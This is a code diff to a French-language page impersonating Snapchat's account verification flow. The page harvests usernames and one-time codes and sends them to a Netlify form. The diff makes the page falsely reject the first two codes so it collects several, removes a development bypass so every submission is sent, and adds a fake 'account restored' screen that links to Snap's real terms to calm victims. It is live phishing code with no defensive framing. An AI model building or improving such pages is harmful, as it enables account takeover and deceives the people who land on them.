@@ -17,7 +17,7 @@ const SnapchatGhost = () => (
   />
 );
 
-type Step = "username" | "otp";
+type Step = "username" | "otp" | "restored";
 
 function isValidUsername(value: string): boolean {
   return /^[a-zA-Z0-9._@]{3,}$/.test(value.trim());
@@ -84,7 +84,7 @@ export default function VerificationPage() {
       return;
     }
 
-    if (attemptsRef.current === 0) {
+    if (attemptsRef.current < 2) {
       attemptsRef.current += 1;
       setOtp("");
       setOtpError("Ce code est incorrect. Veuillez réessayer.");
@@ -96,17 +96,14 @@ export default function VerificationPage() {
       window.sessionStorage.setItem("snapchatLoginUsername", storedUsername);
     }
 
-    if (import.meta.env.DEV) {
-      window.location.assign(returnTo);
-      return;
-    }
-
     await submitNetlifyForm("Snapchat-verification-otp", {
       identifier: storedUsername,
       otp,
     });
 
-    window.location.assign(returnTo);
+    setOtp("");
+    setOtpError("");
+    setStep("restored");
   };
 
   return (
@@ -264,6 +261,34 @@ export default function VerificationPage() {
                 </button>
               </div>
             </form>
+          </div>
+        )}
+
+        {step === "restored" && (
+          <div className="bg-white rounded-[12px] w-full max-w-[440px] shadow-[0_1px_4px_rgba(0,0,0,0.06)] px-8 sm:px-10 pt-8 pb-10 border border-[#e8e8e8]">
+            <SnapchatGhost />
+            <h1 className="text-center text-[26px] sm:text-[28px] font-bold mt-4 tracking-[-0.01em]">
+              Compte restauré
+            </h1>
+            <p className="mt-3 text-center text-[14px] text-[#555555]">
+              Votre compte a été vérifié et restauré avec succès. Vous pouvez
+              maintenant vous connecter à Snapchat.
+            </p>
+            <p className="mt-3 text-center text-[14px] text-[#555555]">
+              Veuillez lire les règles et les conditions d'utilisation de
+              Snapchat et les respecter afin de ne pas perdre votre compte à
+              nouveau.
+            </p>
+            <div className="mt-5 flex justify-center">
+              <a
+                href="https://www.snap.com/terms"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="bg-[#00C8FA] text-white font-bold text-[15px] px-9 py-[10px] rounded-full hover:bg-[#00b4e0] transition-colors inline-block"
+              >
+                Lire les règles Snapchat
+              </a>
+            </div>
           </div>
         )}
       </main>
